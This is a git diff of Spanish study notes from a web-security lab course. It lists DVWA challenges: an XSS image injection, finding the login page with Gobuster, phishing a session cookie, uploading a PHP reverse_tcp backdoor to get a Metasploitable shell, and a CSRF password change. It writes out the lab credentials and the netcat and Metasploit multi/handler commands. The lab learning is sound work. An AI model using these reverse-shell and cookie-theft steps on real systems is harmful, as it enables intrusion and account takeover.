@@ -100,44 +100,67 @@ MANTENER LA MINIMA CANTIDAD DE PUERTOS EXPUESTO REDUCE LA PRBABLILIDAD DE ATAQUE
 - Usar Content Security Policy (CSP)
 - Implementar HTTPOnly en cookies
 
-**Pendientes**
-Estudiar Kali Linux
-Instalar Kali Linux
-http://10.2.13.185/dvwa/vulnerabilities/xss_r/
-DVWA
-admin
-password
-dhcp snopping
-snyk security
+---
 
-Reto1
-puntos3
-insertar una imagen, en la salida del usuario, la imagen debe decir
-se logro con un payload que es el siguietne
+## Práctica con DVWA (Damn Vulnerable Web Application)
 
-Reto3
-Identificar la url
-del login de DVWA
-http// dvwa.seginfo.co
+### Configuración Inicial
+- **URL Lab**: http://10.2.13.185/dvwa/vulnerabilities/xss_r/
+- **Credenciales DVWA**:
+  - Usuario: `admin`
+  - Password: `password`
 
-solucion automatica dirbuster
-                    gobuster
+### Herramientas de Seguridad Mencionadas
+- **DHCP Snooping**: Técnica de seguridad de red
+- **Snyk Security**: Herramienta de análisis de vulnerabilidades
+- **Dirbuster**: Herramienta de fuerza bruta para directorios/archivos
+- **Gobuster**: Herramienta de enumeración de directorios y archivos
 
-Reto4
-Robar la cookie de sesion de Javier Dúran
-(usuario:admin) via phishing
-Pista: A Durán le gustan los viajes
-PDT: mostrar la sesión
+---
 
-Reto5 (media)
-Creaar payload
-reverse_tcp
-A través de la vul upload backdoor de Dwva GANAR UNA SESION DE SHELL DE METASPLOITABLE POR MEDIO DE UN PAYLOAD BACKDOOR php
-NOTA: LA SESIONSHELL DEBE MOSTRAR EL NOMBRE DE METAPLOITABLE AL EJECUTAR COMANDO HOSTNAME
+## Retos de Laboratorio
 
+### Reto 1 (3 puntos)
+**Objetivo**: Insertar una imagen en la salida del usuario mediante XSS
+- Se logró con un payload específico
+
+### Reto 3
+**Objetivo**: Identificar la URL del login de DVWA
+- **Solución**: http://dvwa.seginfo.co
+- **Herramientas**: Dirbuster o Gobuster (solución automática)
+
+### Reto 4
+**Objetivo**: Robar la cookie de sesión de Javier Durán (usuario: admin) vía phishing
+- **Pista**: A Durán le gustan los viajes
+- **Requisito**: Mostrar la sesión capturada
+
+### Reto 5 (Dificultad Media)
+**Objetivo**: Crear payload reverse_tcp y ganar una sesión shell en Metasploitable
+- **Método**: A través de la vulnerabilidad de upload backdoor en DVWA
+- **Tipo**: Backdoor PHP
+- **Requisito**: La sesión shell debe mostrar el nombre de Metasploitable al ejecutar `hostname`
+
+**Comandos utilizados:**
+```bash
+# Escuchar conexiones entrantes
 nc -l -p 4444
+
+# Verificar puerto
 nmap localhost -p 4444
+
+# Configurar Metasploit
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
 set LHOST 10.2.13.215
-SET LPORT 4444
+set LPORT 4444
+```
+
+### Reto 6
+**Objetivo**: Provocar un cambio de contraseña no intencionado del admin de otro compañero
+- **Método**: A través de la vulnerabilidad CSRF (Cross-Site Request Forgery) en DVWA
+
+---
+
+## Pendientes
+- Estudiar Kali Linux
+- Instalar Kali Linux
